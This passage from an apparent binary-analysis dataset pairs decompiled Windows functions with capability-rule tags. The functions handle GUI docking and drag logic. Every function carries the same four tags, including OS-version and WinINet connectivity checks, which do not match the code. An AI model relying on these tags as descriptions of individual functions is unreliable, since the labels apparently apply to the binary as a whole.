        "decompiled_code": "\nuint fcn.00459190(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = 0x4591ae;\n    cVar1 = fcn.004588a0();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x5b) != '\\x05')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            puStack72 = 0x4591d4;\n            iVar2 = fcn.00454684();\n            if (iVar2 < 1) {\n                return 1;\n            }\n        }\n        puStack72 = 0x4591ea;\n        (**(*in_EAX + 0xc0))();\n        puStack72 = 0x4591f5;\n        (**(*in_EAX + 0x44))();\n        puStack72 = 0x459203;\n        (**(*in_EAX + 0x90))();\n        puStack72 = 0x45920b;\n        fcn.004541a0();\n        uStack76 = 0x4592be;\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        iVar2 = fcn.00454684();\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar3 = fcn.00454648();\n                if ((*(piVar3 + 0x57) != '\\0') || (((*(piVar3 + 7) & 0x10) != 0 && ((*(piVar3 + 0x51) & 4) == 0)))) {\n                    (**(*piVar3 + 0x88))(piVar3[0x13], piVar3[0x12]);\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x4592c5;\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n        uStack76 = 0x4592bd;\n        uVar4 = fcn.004541a8();\n        return uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 626
    },
    "00459888": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459888(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x30);\n    while ((iVar2 = iVar1,  *(in_EAX + 0x94) == 0 && (iVar2 != 0))) {\n        in_EAX = iVar2;\n        iVar1 = *(iVar2 + 0x30);\n    }\n    if (in_EAX != 0) {\n        fcn.004503cc(param_2 & 0x7f);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "004599fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004599fc(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x459a10;\n    cVar2 = fcn.004588a0();\n    if ((cVar2 == '\\0') || ((*(in_EAX + 0x55) & 0x20) != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        puStack20 = 0x459a36;\n        fcn.00459934();\n    }\n    uStack24 = 0x459a6c;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00450704();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x459a73;\n    if (bVar1) {\n        uStack24 = 0x459a6b;\n        fcn.00459934();\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "00459ccc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459ccc(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x459d57;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00459870();\n    if (*(in_EAX + 600) == '\\0') {\n        fcn.00450830();\n        fcn.0042551c();\n        fcn.0044ff28();\n        fcn.00450830();\n        fcn.00425538();\n        fcn.0044ff5c();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x459d5e;\n    uStack24 = 0x459d56;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 230
    },
    "0045a0f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a0f8(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 != *(in_EAX + 0x68)) && (*(in_EAX + 0x68) = param_2,  *(in_EAX + 0x6a) != '\\0')) {\n        fcn.00444244();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0045a11c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045a11c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint var_4h;\n    \n    uVar2 = 0;\n    cVar1 = fcn.004485d0();\n    if (cVar1 != '\\0') {\n        if (*(in_EAX + 0x6a) == '\\0') {\n            fcn.0045a0b0(*(in_EAX + 0x74));\n        }\n        uVar2 = fcn.0045a190(arg_8h);\n        if (uVar2 != '\\0') {\n            *(in_EAX + 0x7c) = *(**0x495d00 + 0x44);\n            fcn.00444244();\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 192
    },
    "0045a1f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a1f4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = fcn.004485d0();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x6c) != 0)) {\n        sub.comctl32.dll_ImageList_DragLeave(*(in_EAX + 0x6c));\n        *(in_EAX + 0x6c) = 0;\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0045a28c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0045a28c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    \n    cVar1 = fcn.004485d0();\n    if ((cVar1 == '\\0') || (*(in_EAX + 0x6a) == '\\0')) {\n        bVar3 = false;\n    }\n    else {\n        fcn.0045a1f4();\n        iVar2 = sub.comctl32.dll_ImageList_EndDrag();\n        bVar3 = iVar2 != 0;\n        *(in_EAX + 0x6a) = 0;\n        fcn.0045a0f8();\n        fcn.00444244();\n    }\n    return bVar3;\n}\n",
        "token_count": 173
    },
    "0045a2dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0045a2dc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.004534d0();\n    uVar1 = fcn.004250b4();\n    *(in_EAX + 0x250) = uVar1;\n    fcn.0044f0dc();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 202
    },
    "0045a454": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045a454(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x14) == 0) || (*(*(in_EAX + 0x14) + 0x10) == '\\0')) &&\n       ((in_EAX != *(*(in_EAX + 0x1c) + 100) || (*(in_EAX + 0x10) == '\\0')))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "0045a59c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045a59c(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint uStack32;\n    uint uStack28;\n    \n    iVar1 = in_EAX;\n    while (iVar3 = iVar1,  iVar3 != *(*(in_EAX + 0x1c) + 100)) {\n        iVar1 = *(iVar3 + 0x14);\n        if ((param_2 == *(iVar1 + 0x10)) && (*(iVar3 + 0x18) != 0)) {\n            uVar2 = fcn.0045a9f4();\n            return uVar2;\n        }\n    }\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n    if (param_2 == '\\x01') {\n        return uStack28;\n    }\n    if (param_2 == '\\x02') {\n        return uStack32;\n    }\n    return 0;\n}\n",
        "token_count": 271
    },
    "0045a620": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045a620(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    if ((in_EAX == *(*(in_EAX + 0x1c) + 100)) ||\n       (((iVar2 = in_EAX,  *(*(in_EAX + 0x1c) + 100) == *(in_EAX + 0x14) && (*(in_EAX + 4) != 0)) &&\n        (iVar1 = fcn.0045a4b0(),  iVar1 == 1)))) {\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n        if (param_2 == '\\x01') {\n            iVar2 = iStack20 - iStack28;\n        }\n        else {\n            iVar2 = iStack24 - iStack32;\n        }\n    }\n    else {\n        for (; iVar2 != *(*(in_EAX + 0x1c) + 100); iVar2 = *(iVar2 + 0x14)) {\n            if (param_2 == *(*(iVar2 + 0x14) + 0x10)) {\n                iVar2 = fcn.0045a9f4();\n                iVar1 = fcn.0045a50c();\n                return iVar2 - iVar1;\n            }\n        }\n        if (param_2 == *(*(*(in_EAX + 0x1c) + 100) + 0x10)) {\n            iVar2 = *(*(in_EAX + 0x1c) + 0x68);\n        }\n        else {\n            iVar2 = fcn.0045a9f4();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 458
    },
    "0045a6d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0045a6d8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0045a4b0();\n    if ((iVar1 != 0) && (*(in_EAX + 0x10) != '\\0')) {\n        iVar2 = fcn.0045aaf8();\n        if (*(in_EAX + 0x10) == '\\x01') {\n            iVar1 = fcn.0045a620();\n        }\n        else if (*(in_EAX + 0x10) == '\\x02') {\n            iVar1 = fcn.0045a620();\n        }\n        else {\n            iVar1 = 0;\n        }\n        iVar3 = fcn.0045a4b0();\n        iVar1 = iVar1 / iVar3;\n        while (iVar2 != 0) {\n            if (*(iVar2 + 0xc) == 0) {\n                fcn.0045aa1c();\n            }\n            else {\n                fcn.0045a50c();\n                fcn.0045aa1c();\n            }\n            fcn.0045a878();\n            iVar1 = fcn.0045aad0();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 299
    },
    "0045a780": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a780(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00405530();\n    if (*(in_EAX + 4) != 0) {\n        if (*(*(in_EAX + 4) + 8) == 0) {\n            fcn.0040dbc0();\n            fcn.00404ec4();\n        }\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0045a7c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x0045a7f9)\n\nuint fcn.0045a7c4(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.0040484c();\n    return 0;\n}\n",
        "token_count": 83
    },
    "0045a878": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a878(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *arg_8h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    iVar2 = *(in_EAX + 4);\n    if (iVar2 == 0) {\n        return;\n    }\n    if (*(iVar2 + 0x57) == '\\0') {\n        return;\n    }\n    if (*(*(in_EAX + 0x1c) + 0x6c) != 0) {\n        return;\n    }\n    *(iVar2 + 0x90) = *(*(in_EAX + 0x14) + 0x10);\n    var_4h = in_EAX;\n    fcn.0045a620();\n    iVar2 = fcn.0045a620();\n    cVar1 = fcn.0045a848(&stack0xfffffffc);\n    if ((cVar1 != '\\0') && (*(*(var_4h + 0x14) + 0x10) != '\\x01')) {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\n    iVar3 = fcn.0045aad0();\n    if ((iVar3 == 0) &&\n       (((*(var_4h + 0x14) == *(*(var_4h + 0x1c) + 100) ||\n         (*(*(var_4h + 0x14) + 0x10) != *(*(*(var_4h + 0x1c) + 100) + 0x10))) ||\n        (iVar3 = fcn.0045a9f4(),  *(*(var_4h + 0x1c) + 0x68) <= iVar3)))) {\n        if (*(*(var_4h + 0x14) + 0x10) == *(*(*(var_4h + 0x1c) + 100) + 0x10)) goto code_r0x0045a9a1;\n        iVar3 = fcn.0045a9f4();\n        iVar4 = fcn.0045a9f4();\n        if (iVar4 <= iVar3) goto code_r0x0045a9a1;\n    }\n    if (*(*(var_4h + 0x14) + 0x10) == '\\x01') {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\ncode_r0x0045a9a1:\n    arg_8h = &var_14h;\n    uVar5 = fcn.0045a59c();\n    fcn.0045a59c(uVar5);\n    fcn.0041848c(arg_8h, iVar2);\n    (****(var_4h + 0x1c))();\n    fcn.00450170();\n    return;\n}\n",
        "token_count": 688
    },
    "0045acf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045acf0(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(arg_8h + -4) == *(in_EAX + 4)) {\n        *(arg_8h + -8) = in_EAX;\n        return;\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 0xc) != 0)) {\n        fcn.0045acf0(arg_8h);\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 8) != 0)) {\n        fcn.0045acf0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0045ad48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045ad48(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((param_2 != 0) && (*(in_EAX + 100) != 0)) {\n        fcn.0045acf0(&stack0xfffffffc);\n    }\n    return 0;\n}\n",
        "token_count": 93
    },
    "0045ae4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0045ae4c(uint arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t in_CL;\n    uint8_t uVar4;\n    int32_t in_EDX;\n    int32_t var_30h;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (*(in_EDX + 0x57) != '\\0') {\n        var_1h._0_1_ = in_CL;\n        if (in_EAX[0xe] == 0) {\n            if (*(in_EAX[0x19] + 8) == 0) {\n                (**(*in_EAX[5] + 0x44))();\n                (**(*in_EAX[5] + 0x90))();\n                var_10h = var_14h - var_1ch;\n                if (*(in_EAX[5] + 0x5c) != '\\0') {\n                    if (var_18h == var_20h) {\n                        fcn.004507d0();\n                    }\n                    if (var_10h == 0) {\n                        var_10h = fcn.004507bc();\n                    }\n                }\n                fcn.0041848c(&var_30h, var_10h);\n                var_20h = var_30h;\n                var_1ch = iStack48;\n                var_18h = iStack44;\n                var_14h = iStack40;\n                (***in_EAX)();\n                fcn.00450170();\n                iVar1 = fcn.0045a478();\n                iVar2 = in_EAX[0x19];\n                *(iVar2 + 8) = iVar1;\n                *(iVar1 + 0x14) = iVar2;\n                *(iVar1 + 4) = in_EDX;\n            }\n            else {\n                if ((in_CL == 0) || (in_CL == 5)) {\n                    var_1h._0_1_ = 4;\n                }\n                iVar2 = fcn.0045ad48();\n                if (iVar2 != 0) {\n                    fcn.0045bf9c();\n                }\n                var_8h = fcn.0045ad48();\n                var_9h = *(var_1h + 0x493760);\n                iVar2 = fcn.0045a49c();\n                if (iVar2 == 1) {\n                    *(in_EAX[0x19] + 0x10) = var_9h;\n                    if (var_9h == 1) {\n                        fcn.0045a620();\n                        fcn.0045aa1c();\n                        uVar3 = fcn.0045a620();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                    else if (var_9h == 2) {\n                        fcn.0045a620();\n                        fcn.0045aa1c();\n                        uVar3 = fcn.0045a620();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                }\n                iVar2 = fcn.0045a478();\n                *(iVar2 + 4) = in_EDX;\n                if (var_8h == 0) {\n                    uVar4 = *(in_EAX[0x19] + 0x10);\n                }\n                else {\n                    uVar4 = *(*(var_8h + 0x14) + 0x10);\n                }\n                if (var_9h == 0) {\n                    var_9h = uVar4;\n                }\n                if (uVar4 == var_9h) {\n                    fcn.0045b210(*(var_1h + 0x493768));\n                }\n                else {\n                    fcn.0045b068(*(var_1h + 0x493768), var_9h);\n                }\n            }\n        }\n        else {\n            *(in_EAX[0xe] + 4) = in_EDX;\n            fcn.0045a878();\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1035
    },
    "0045b068": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b068(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar2 = fcn.0045a478();\n    *(iVar2 + 0x10) = arg_ch;\n    if (in_ECX == 0) {\n        fcn.0045aa1c();\n        uVar3 = fcn.0045a9f4();\n        *(in_EAX + 0x68) = uVar3;\n        *(in_EAX + 0x48) = arg_ch;\n        *(in_EAX + 0x40) = 0;\n        *(in_EAX + 0x44) = 0x3fe00000;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0x18) = in_EDX;\n            *(in_EDX + 0xc) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.0045adb0(0x45c324);\n            uVar4 = fcn.0045a9f4();\n            iVar2 = uVar4 >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((uVar4 & 1) != 0);\n            }\n            *(in_EAX + 0x4c) = iVar2;\n            fcn.0045adb0(0x45c774);\n            fcn.0045a9f4();\n            fcn.0045aa1c();\n        }\n        else {\n            *(iVar2 + 8) = *(in_EAX + 100);\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.0045adb0(0x45c324);\n        }\n        fcn.0045adb0(0x45c8ac);\n    }\n    else {\n        fcn.0045a9f4();\n        fcn.0045aa1c();\n        *(iVar2 + 0x14) = *(in_ECX + 0x14);\n        iVar1 = *(in_ECX + 0x18);\n        *(iVar2 + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = iVar2;\n        }\n        iVar1 = *(in_ECX + 0xc);\n        *(iVar2 + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = iVar2;\n        }\n        if (in_ECX == *(*(iVar2 + 0x14) + 8)) {\n            *(*(iVar2 + 0x14) + 8) = iVar2;\n        }\n        *(in_EDX + 0x14) = iVar2;\n        *(in_ECX + 0x14) = iVar2;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            *(in_ECX + 0x18) = in_EDX;\n            *(in_ECX + 0xc) = 0;\n            *(in_EDX + 0xc) = in_ECX;\n        }\n        else {\n            *(iVar2 + 8) = in_ECX;\n            *(in_ECX + 0x18) = 0;\n            *(in_ECX + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = in_ECX;\n        }\n    }\n    fcn.0045a6d8();\n    fcn.0045aa70();\n    fcn.0045adb0(0x45c8ac);\n    return;\n}\n",
        "token_count": 983
    },
    "0045b288": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0045b288(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar1 = fcn.0045a59c();\n    iVar2 = fcn.0045a59c();\n    if (*(in_EAX + 0x1c) == '\\0') {\n        if (((iVar2 <= *in_ECX) && (*in_ECX <= *(in_EAX + 0x18) + iVar2)) && (iVar1 <= in_ECX[1])) {\n            iVar2 = fcn.0045a620();\n            if (in_ECX[1] <= iVar1 + iVar2) {\n                var_5h = 1;\n                if (in_ECX[1] < *(*(in_EDX + 4) + 0x44) + 0xf) {\n                    *arg_8h = 0x14;\n                }\n                else {\n                    *arg_8h = 2;\n                }\n            }\n        }\n    }\n    else if (((iVar1 <= in_ECX[1]) && (in_ECX[1] <= iVar1 + *(in_EAX + 0x18))) && (iVar2 <= *in_ECX)) {\n        iVar1 = fcn.0045a620();\n        if (*in_ECX <= iVar1 + iVar2) {\n            var_5h = 1;\n            if (*(*(in_EDX + 4) + 0x40) + *(*(in_EDX + 4) + 0x48) + -0xf < *in_ECX) {\n                *arg_8h = 0x14;\n            }\n            else {\n                *arg_8h = 2;\n            }\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 444
    },
    "0045b38c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.0045b38c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uchar *puStack40;\n    uint uStack36;\n    uchar auStack20 [4];\n    \n    iVar2 = fcn.00454684();\n    iVar2 = iVar2 + -1;\n    if (-1 < iVar2) {\n        do {\n            piVar3 = fcn.00454648();\n            if ((*(piVar3 + 0x57) != '\\0') && ((cVar1 = fcn.004047dc(),  cVar1 == '\\0' || (*(piVar3 + 0x1da) != '\\0'))))\n            {\n                fcn.00418428();\n                (**(*piVar3 + 0x44))(puStack40, uStack36);\n                puStack40 = auStack20;\n                iVar4 = sub.user32.dll_PtInRect();\n                if (iVar4 != 0) {\n                    return piVar3;\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return NULL;\n}\n",
        "token_count": 266
    },
    "0045b418": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b418(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.0045a9f4();\n        if (*(*(arg_8h + -4) + 4) <= iVar2) {\n            iVar2 = fcn.0045a9f4();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= *(*(arg_8h + -4) + 4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x0045b4db;\n            }\n        }\n    }\n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x02') {\n        iVar2 = fcn.0045a9f4();\n        if (**(arg_8h + -4) <= iVar2) {\n            iVar2 = fcn.0045a9f4();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= **(arg_8h + -4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x0045b4db;\n            }\n        }\n    }\n    if (*(in_EAX + 4) != 0) {\n        cVar1 = 